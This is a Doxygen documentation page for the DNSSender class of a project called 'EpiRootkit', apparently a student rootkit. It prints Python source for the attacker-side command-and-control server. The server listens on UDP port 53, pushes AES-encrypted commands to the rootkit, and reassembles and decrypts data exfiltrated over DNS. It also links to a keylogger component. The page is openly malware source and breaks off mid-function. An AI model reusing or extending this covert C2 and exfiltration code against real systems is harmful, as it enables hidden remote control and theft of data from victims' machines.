<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: DNSSender Class Reference</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('da/d69/classDNSSender_1_1DNSSender.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div class="header">
  <div class="summary">
<a href="#nested-classes">Classes</a> &#124;
<a href="#pub-methods">Public Member Functions</a> &#124;
<a href="#pub-attribs">Public Attributes</a> &#124;
<a href="#pro-attribs">Protected Attributes</a> &#124;
<a href="../../da/d77/classDNSSender_1_1DNSSender-members.html">List of all members</a>  </div>
  <div class="headertitle"><div class="title">DNSSender Class Reference</div></div>
</div><!--header-->
<div class="contents">
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a id="nested-classes" name="nested-classes"></a>
Classes</h2></td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">class &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d0/d88/classDNSSender_1_1DNSSender_1_1DNSHandler.html">DNSHandler</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a id="pub-methods" name="pub-methods"></a>
Public Member Functions</h2></td></tr>
<tr class="memitem:a0ffb84124b4240d054d291e6c52852b0" id="r_a0ffb84124b4240d054d291e6c52852b0"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a0ffb84124b4240d054d291e6c52852b0">__init__</a> (self, <a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#aee6e0cd65a787643e49e447538a62770">owner</a>=None)</td></tr>
<tr class="separator:a0ffb84124b4240d054d291e6c52852b0"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac1744d3e897d20205cf247f8d75d3698" id="r_ac1744d3e897d20205cf247f8d75d3698"><td class="memItemLeft" align="right" valign="top">None&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#ac1744d3e897d20205cf247f8d75d3698">start</a> (self)</td></tr>
<tr class="separator:ac1744d3e897d20205cf247f8d75d3698"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af47089b4649a9a45e0d1c2e87d695689" id="r_af47089b4649a9a45e0d1c2e87d695689"><td class="memItemLeft" align="right" valign="top">None&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#af47089b4649a9a45e0d1c2e87d695689">stop</a> (self)</td></tr>
<tr class="separator:af47089b4649a9a45e0d1c2e87d695689"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8e7ac8331d60a64abf71d6cf81991398" id="r_a8e7ac8331d60a64abf71d6cf81991398"><td class="memItemLeft" align="right" valign="top">str&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a8e7ac8331d60a64abf71d6cf81991398">send</a> (self, str <a class="el" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>)</td></tr>
<tr class="separator:a8e7ac8331d60a64abf71d6cf81991398"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa7dff9114ac8de96ad306f44cc109b26" id="r_aa7dff9114ac8de96ad306f44cc109b26"><td class="memItemLeft" align="right" valign="top">str&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#aa7dff9114ac8de96ad306f44cc109b26">assemble_exfil</a> (self, timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL)</td></tr>
<tr class="separator:aa7dff9114ac8de96ad306f44cc109b26"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a9d74fe8497ed2571f2e9d86f63437e07" id="r_a9d74fe8497ed2571f2e9d86f63437e07"><td class="memItemLeft" align="right" valign="top">bool&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a9d74fe8497ed2571f2e9d86f63437e07">is_running</a> (self)</td></tr>
<tr class="separator:a9d74fe8497ed2571f2e9d86f63437e07"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a id="pub-attribs" name="pub-attribs"></a>
Public Attributes</h2></td></tr>
<tr class="memitem:ad997db1bc5aec8948b780cd64f9fda71" id="r_ad997db1bc5aec8948b780cd64f9fda71"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#ad997db1bc5aec8948b780cd64f9fda71">command_queue</a></td></tr>
<tr class="separator:ad997db1bc5aec8948b780cd64f9fda71"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a35ffedec6e01508f4303ebadc26ce456" id="r_a35ffedec6e01508f4303ebadc26ce456"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a35ffedec6e01508f4303ebadc26ce456">exfil_buffer</a></td></tr>
<tr class="separator:a35ffedec6e01508f4303ebadc26ce456"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a93c988ce4a7789d162639e8f72c112cb" id="r_a93c988ce4a7789d162639e8f72c112cb"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a93c988ce4a7789d162639e8f72c112cb">expected_chunks</a></td></tr>
<tr class="separator:a93c988ce4a7789d162639e8f72c112cb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aee6e0cd65a787643e49e447538a62770" id="r_aee6e0cd65a787643e49e447538a62770"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#aee6e0cd65a787643e49e447538a62770">owner</a></td></tr>
<tr class="separator:aee6e0cd65a787643e49e447538a62770"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a id="pro-attribs" name="pro-attribs"></a>
Protected Attributes</h2></td></tr>
<tr class="memitem:a97a1a75ef11a4e52741a9fb7d366f56b" id="r_a97a1a75ef11a4e52741a9fb7d366f56b"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a97a1a75ef11a4e52741a9fb7d366f56b">_running</a></td></tr>
<tr class="separator:a97a1a75ef11a4e52741a9fb7d366f56b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a918fd5a7f89e9729812a35eff09f3f74" id="r_a918fd5a7f89e9729812a35eff09f3f74"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a918fd5a7f89e9729812a35eff09f3f74">_server</a></td></tr>
<tr class="separator:a918fd5a7f89e9729812a35eff09f3f74"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1651625c88209f521cb5a16c226eec58" id="r_a1651625c88209f521cb5a16c226eec58"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a1651625c88209f521cb5a16c226eec58">_thread</a></td></tr>
<tr class="separator:a1651625c88209f521cb5a16c226eec58"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a199fe9bca674a3f92e800a6eb2f0712a" id="r_a199fe9bca674a3f92e800a6eb2f0712a"><td class="memItemLeft" align="right" valign="top">&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../da/d69/classDNSSender_1_1DNSSender.html#a199fe9bca674a3f92e800a6eb2f0712a">_crypto</a></td></tr>
<tr class="separator:a199fe9bca674a3f92e800a6eb2f0712a"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<a name="details" id="details"></a><h2 class="groupheader">Detailed Description</h2>
<div class="textblock"><pre class="fragment">Pushes commands into `config.command_queue`
and then blocks on `assemble_exfil()` for the response.
</pre> 
<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00010">10</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>
</div><h2 class="groupheader">Constructor &amp; Destructor Documentation</h2>
<a id="a0ffb84124b4240d054d291e6c52852b0" name="a0ffb84124b4240d054d291e6c52852b0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0ffb84124b4240d054d291e6c52852b0">&#9670;&#160;</a></span>__init__()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">__init__ </td>
          <td>(</td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>self</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>owner</em> = <code>None</code>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00016">16</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   16</span>    <span class="keyword">def </span>__init__(self, owner=None):</div>
<div class="line"><span class="lineno">   17</span>        self.command_queue = []  </div>
<div class="line"><span class="lineno">   18</span>        self.exfil_buffer = {} </div>
<div class="line"><span class="lineno">   19</span>        self.expected_chunks = <span class="keywordtype">None</span> </div>
<div class="line"><span class="lineno">   20</span> </div>
<div class="line"><span class="lineno">   21</span>        self.owner = owner</div>
<div class="line"><span class="lineno">   22</span>        self._running = <span class="keyword">False</span></div>
<div class="line"><span class="lineno">   23</span> </div>
<div class="line"><span class="lineno">   24</span>        self._server = <span class="keywordtype">None</span></div>
<div class="line"><span class="lineno">   25</span>        self._thread = <span class="keywordtype">None</span></div>
<div class="line"><span class="lineno">   26</span> </div>
<div class="line"><span class="lineno">   27</span>        self._crypto = <a class="code hl_namespace" href="../../dd/dbe/namespaceCryptoHandler.html">CryptoHandler</a>(cfg.AES_KEY, cfg.AES_IV)</div>
<div class="line"><span class="lineno">   28</span> </div>
<div class="ttc" id="anamespaceCryptoHandler_html"><div class="ttname"><a href="../../dd/dbe/namespaceCryptoHandler.html">CryptoHandler</a></div><div class="ttdef"><b>Definition</b> <a href="../../da/d77/CryptoHandler_8py_source.html#l00001">CryptoHandler.py:1</a></div></div>
</div><!-- fragment -->
</div>
</div>
<h2 class="groupheader">Member Function Documentation</h2>
<a id="aa7dff9114ac8de96ad306f44cc109b26" name="aa7dff9114ac8de96ad306f44cc109b26"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aa7dff9114ac8de96ad306f44cc109b26">&#9670;&#160;</a></span>assemble_exfil()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"> str assemble_exfil </td>
          <td>(</td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>self</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>timeout</em> = <code>cfg.DNS_RESPONSE_TIMEOUT</code>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>poll</em> = <code>cfg.DNS_POLL_INTERVAL</code>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">
<pre class="fragment">Waits up to `timeout` seconds for all expected chunks to arrive,
polling `exfil_buffer` every `poll` seconds. Returns the assembled
text (or empty string on timeout).
</pre> 
<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00124">124</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  124</span>    <span class="keyword">def </span>assemble_exfil(self, timeout=cfg.DNS_RESPONSE_TIMEOUT, poll=cfg.DNS_POLL_INTERVAL) -&gt; str:</div>
<div class="line"><span class="lineno">  125</span>        <span class="stringliteral">&quot;&quot;&quot;</span></div>
<div class="line"><span class="lineno">  126</span><span class="stringliteral">        Waits up to `timeout` seconds for all expected chunks to arrive,</span></div>
<div class="line"><span class="lineno">  127</span><span class="stringliteral">        polling `exfil_buffer` every `poll` seconds. Returns the assembled</span></div>
<div class="line"><span class="lineno">  128</span><span class="stringliteral">        text (or empty string on timeout).</span></div>
<div class="line"><span class="lineno">  129</span><span class="stringliteral">        &quot;&quot;&quot;</span></div>
<div class="line"><span class="lineno">  130</span> </div>
<div class="line"><span class="lineno">  131</span>        <span class="comment"># Start the timer</span></div>
<div class="line"><span class="lineno">  132</span>        start = time.time()</div>
<div class="line"><span class="lineno">  133</span> </div>
<div class="line"><span class="lineno">  134</span>        <span class="keywordflow">while</span> <span class="keyword">True</span>:</div>
<div class="line"><span class="lineno">  135</span>            <span class="comment"># Check if we have received all expected chunks</span></div>
<div class="line"><span class="lineno">  136</span>            <span class="keywordflow">if</span> self.expected_chunks <span class="keywordflow">is</span> <span class="keywordflow">not</span> <span class="keywordtype">None</span> <span class="keywordflow">and</span> len(self.exfil_buffer) &gt;= self.expected_chunks:</div>
<div class="line"><span class="lineno">  137</span>                <span class="keywordflow">break</span></div>
<div class="line"><span class="lineno">  138</span> </div>
<div class="line"><span class="lineno">  139</span>            <span class="comment"># If we time out, break the loop</span></div>
<div class="line"><span class="lineno">  140</span>            <span class="keywordflow">if</span> time.time() - start &gt; timeout:</div>
<div class="line"><span class="lineno">  141</span>                <span class="keywordflow">break</span></div>
<div class="line"><span class="lineno">  142</span> </div>
<div class="line"><span class="lineno">  143</span>            <span class="comment"># Sleep for a short while before checking again</span></div>
<div class="line"><span class="lineno">  144</span>            time.sleep(poll)</div>
<div class="line"><span class="lineno">  145</span> </div>
<div class="line"><span class="lineno">  146</span>        <span class="comment"># If we have received all expected chunks, assemble the data</span></div>
<div class="line"><span class="lineno">  147</span>        data = b<span class="stringliteral">&quot;&quot;</span></div>
<div class="line"><span class="lineno">  148</span>        <span class="keywordflow">if</span> self.expected_chunks <span class="keywordflow">is</span> <span class="keywordflow">not</span> <span class="keywordtype">None</span> <span class="keywordflow">and</span> len(self.exfil_buffer) &gt;= self.expected_chunks:</div>
<div class="line"><span class="lineno">  149</span>            data = b<span class="stringliteral">&#39;&#39;</span>.join(self.exfil_buffer[i] <span class="keywordflow">for</span> i <span class="keywordflow">in</span> range(self.expected_chunks))</div>
<div class="line"><span class="lineno">  150</span>        <span class="keywordflow">else</span>:</div>
<div class="line"><span class="lineno">  151</span>            print(<span class="stringliteral">&quot;[DNS SERVER] Timeout while waiting for all chunks. Returning empty data.&quot;</span>)</div>
<div class="line"><span class="lineno">  152</span>            self.expected_chunks = <span class="keywordtype">None</span></div>
<div class="line"><span class="lineno">  153</span>            self.exfil_buffer.clear()</div>
<div class="line"><span class="lineno">  154</span>            <span class="keywordflow">return</span> <span class="keywordtype">None</span></div>
<div class="line"><span class="lineno">  155</span> </div>
<div class="line"><span class="lineno">  156</span>        <span class="comment"># Reset buffers</span></div>
<div class="line"><span class="lineno">  157</span>        self.expected_chunks = <span class="keywordtype">None</span></div>
<div class="line"><span class="lineno">  158</span>        self.exfil_buffer.clear()</div>
<div class="line"><span class="lineno">  159</span> </div>
<div class="line"><span class="lineno">  160</span>        <span class="comment"># Return result</span></div>
<div class="line"><span class="lineno">  161</span>        <span class="keywordflow">return</span> data </div>
<div class="line"><span class="lineno">  162</span>    </div>
</div><!-- fragment -->
</div>
</div>
<a id="a9d74fe8497ed2571f2e9d86f63437e07" name="a9d74fe8497ed2571f2e9d86f63437e07"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a9d74fe8497ed2571f2e9d86f63437e07">&#9670;&#160;</a></span>is_running()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"> bool is_running </td>
          <td>(</td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>self</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00163">163</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  163</span>    <span class="keyword">def </span><a class="code hl_variable" href="../../d9/dea/epikeylog_8c.html#a95cbd6b99430748422cc048b4f29dc52">is_running</a>(self) -&gt; bool:</div>
<div class="line"><span class="lineno">  164</span>        <span class="keywordflow">return</span> self._running</div>
<div class="line"><span class="lineno">  165</span>     </div>
<div class="ttc" id="aepikeylog_8c_html_a95cbd6b99430748422cc048b4f29dc52"><div class="ttname"><a href="../../d9/dea/epikeylog_8c.html#a95cbd6b99430748422cc048b4f29dc52">is_running</a></div><div class="ttdeci">static bool is_running</div><div class="ttdef"><b>Definition</b> <a href="../../d9/dea/epikeylog_8c_source.html#l00142">epikeylog.c:142</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a8e7ac8331d60a64abf71d6cf81991398" name="a8e7ac8331d60a64abf71d6cf81991398"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8e7ac8331d60a64abf71d6cf81991398">&#9670;&#160;</a></span>send()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"> str send </td>
          <td>(</td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>self</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">str&#160;</td>
          <td class="paramname"><em>message</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00072">72</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   72</span>    <span class="keyword">def </span>send(self, message: str) -&gt; str:</div>
<div class="line"><span class="lineno">   73</span>        <span class="keywordflow">if</span> (len(self.exfil_buffer) &gt; 0):</div>
<div class="line"><span class="lineno">   74</span>            msg = <span class="stringliteral">&quot;[DNS SERVER] Cannot send new command. Please wait for the previous command to complete.&quot;</span></div>
<div class="line"><span class="lineno">   75</span>            self.owner._command_history.append(</div>
<div class="line"><span class="lineno">   76</span>                {<span class="stringliteral">&quot;command&quot;</span>: message, </div>
<div class="line"><span class="lineno">   77</span>                 <span class="stringliteral">&quot;stdout&quot;</span>: <span class="stringliteral">&quot;&quot;</span>, </div>
<div class="line"><span class="lineno">   78</span>                 <span class="stringliteral">&quot;stderr&quot;</span>: msg, </div>
<div class="line"><span class="lineno">   79</span>                 <span class="stringliteral">&quot;termination_code&quot;</span>: <span class="stringliteral">&quot;Undefined&quot;</span>})</div>
<div class="line"><span class="lineno">   80</span>            <span class="keywordflow">return</span> msg</div>
<div class="line"><span class="lineno">   81</span>        </div>
<div class="line"><span class="lineno">   82</span>        <span class="keywordflow">if</span> (len(message) == 0): </div>
<div class="line"><span class="lineno">   83</span>            msg = <span class="stringliteral">&quot;[DNS SERVER] Empty message, nothing to send.&quot;</span></div>
<div class="line"><span class="lineno">   84</span>            print(msg)</div>
<div class="line"><span class="lineno">   85</span>            <span class="keywordflow">return</span> msg</div>
<div class="line"><span class="lineno">   86</span>       </div>
<div class="line"><span class="lineno">   87</span>        <span class="comment"># Encrypt the message using AES-CBC</span></div>
<div class="line"><span class="lineno">   88</span>        message_encrypted = self._crypto.encrypt(message)</div>
<div class="line"><span class="lineno">   89</span> </div>
<div class="line"><span class="lineno">   90</span>        <span class="keywordflow">if</span> (len(message_encrypted) &gt;= 255):</div>
<div class="line"><span class="lineno">   91</span>            msg = <span class="stringliteral">&quot;[DNS SERVER] Message too long to send via DNS (max 255 char).&quot;</span></div>
<div class="line"><span class="lineno">   92</span>            self.owner._command_history.append(</div>
<div class="line"><span class="lineno">   93</span>                {<span class="stringliteral">&quot;command&quot;</span>: message, </div>
<div class="line"><span class="lineno">   94</span>                 <span class="stringliteral">&quot;stdout&quot;</span>: <span class="stringliteral">&quot;&quot;</span>, </div>
<div class="line"><span class="lineno">   95</span>                 <span class="stringliteral">&quot;stderr&quot;</span>: msg, </div>
<div class="line"><span class="lineno">   96</span>                 <span class="stringliteral">&quot;termination_code&quot;</span>: <span class="stringliteral">&quot;Undefined&quot;</span>})</div>
<div class="line"><span class="lineno">   97</span>            <span class="keywordflow">return</span> msg</div>
<div class="line"><span class="lineno">   98</span> </div>
<div class="line"><span class="lineno">   99</span>        <span class="comment"># Push into global queue</span></div>
<div class="line"><span class="lineno">  100</span>        self.command_queue.append(message_encrypted)</div>
<div class="line"><span class="lineno">  101</span> </div>
<div class="line"><span class="lineno">  102</span>        <span class="comment"># Poll‐assemble-decrypt.</span></div>
<div class="line"><span class="lineno">  103</span>        raw = self.assemble_exfil()</div>
<div class="line"><span class="lineno">  104</span>        <span class="keywordflow">if</span> raw <span class="keywordflow">is</span> <span class="keywordtype">None</span>:</div>
<div class="line"><span class="lineno">  105</span>            msg = <span class="stringliteral">&quot;[DNS SERVER] Timeout while waiting for all chunks. Returning empty data.&quot;</span></div>
<div class="line"><span class="lineno">  106</span>            self.owner._command_history.append(</div>
<div class="line"><span class="lineno">  107</span>                {<span class="stringliteral">&quot;command&quot;</span>: message, </div>
<div class="line"><span class="lineno">  108</span>                 <span class="stringliteral">&quot;stdout&quot;</span>: <span class="stringliteral">&quot;&quot;</span>, </div>
<div class="line"><span class="lineno">  109</span>                 <span class="stringliteral">&quot;stderr&quot;</span>: msg, </div>
<div class="line"><span class="lineno">  110</span>                 <span class="stringliteral">&quot;termination_code&quot;</span>: <span class="stringliteral">&quot;Undefined&quot;</span>})</div>
<div class="line"><span class="lineno">  111</span>            <span class="keywordflow">return</span> msg</div>
<div class="line"><span class="lineno">  112</span> </div>
<div class="line"><span class="lineno">  113</span>        <span class="comment"># Decrypt the received data</span></div>
<div class="line"><span class="lineno">  114</span>        raw_decrypted = self._crypto.decrypt(raw)</div>
<div class="line"><span class="lineno">  115</span>        print(f<span class="stringliteral">&quot;[DNS SERVER] Decrypted received response: {raw_decrypted}&quot;</span>)</div>
<div class="line"><span class="lineno">  116</span>        </div>
<div class="line"><span class="lineno">  117</span>        <span class="comment"># Update in BigMama attributes</span></div>
<div class="line"><span class="lineno">  118</span>        self.owner._check_rootkit_command(raw_decrypted)</div>
<div class="line"><span class="lineno">  119</span>        self.owner._update_command_history(message, raw_decrypted)</div>
<div class="line"><span class="lineno">  120</span> </div>
<div class="line"><span class="lineno">  121</span>        <span class="comment"># Return the response</span></div>
<div class="line"><span class="lineno">  122</span>        <span class="keywordflow">return</span> raw_decrypted</div>
<div class="line"><span class="lineno">  123</span>    </div>
</div><!-- fragment -->
</div>
</div>
<a id="ac1744d3e897d20205cf247f8d75d3698" name="ac1744d3e897d20205cf247f8d75d3698"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ac1744d3e897d20205cf247f8d75d3698">&#9670;&#160;</a></span>start()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"> None start </td>
          <td>(</td>
          <td class="paramtype">&#160;</td>
          <td class="paramname"><em>self</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<pre class="fragment">Starts the DNS server to handle incoming DNS requests.
This server listens on UDP port 53 and processes DNS queries for the specified domain.
Each incoming packet is handled in its own new thread.
</pre> 
<p class="definition">Definition at line <a class="el" href="../../d5/d08/DNSSender_8py_source.html#l00029">29</a> of file <a class="el" href="../../d5/d08/DNSSender_8py_source.html">DNSSender.py</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   29</span>    <span class="keyword">def </span>start(self) -&gt; None:</div>
<div class="line"><span class="lineno">   30</span>        <span class="stringliteral">&quot;&quot;&quot; </span></div>
<div class="line"><span class="lineno">   31</span><span class="stringliteral">        Starts the DNS server to handle incoming DNS requests.</span></div>
<div class="line"><span class="lineno">   32</span><span class="stringliteral">        This server listens on UDP port 53 and processes DNS queries for the specified domain.</span></div>
<div class="line"><span class="lineno">   33</span><span class="stringliteral">        Each incoming packet is handled in its own new thread.</span></div>
<div class="line"><span class="lineno">   34</span><span class="stringliteral">        &quot;&quot;&quot;</span>    </div>
<div class="line"><span class="lineno">   35</span>        <span class="keywordflow">if</span> self._running:</div>
<div class="line"><span class="lineno">   36</span>            print(<span class="stringliteral">&quot;[DNS SERVER] Server is already running.&quot;</span>)</div>
<div class="line"><span class="lineno">   37</span>            <span class="keywordflow">return</span></div>
<div class="line"><span class="lineno">   38</span> </div>
<div class="line"><span class="lineno">   39</span>        self._server = socketserver.ThreadingUDPServer((<span class="stringliteral">&#39;0.0.0.0&#39;</span>, cfg.DNS_PORT), self.DNSHandler)</div>
<div class="line"><span class="lineno">   40</span>        self._server.sender = self</div>
<div class="line"><span class="lineno">   41</span> </div>
<div class="line"><span class="lineno">   42</span>        self._thread = threading.Thread(</div>
<div class="line"><span class="lineno">   43</span>            target=self._server.serve_forever,</div>
<div class="line"><span class="lineno">   44</span>            name=<span class="stringliteral">&quot;DNSServerThread&quot;</span>,</div>
<div class="line"><span class="lineno">   45</span>            daemon=<span class="keyword">True</span></div>
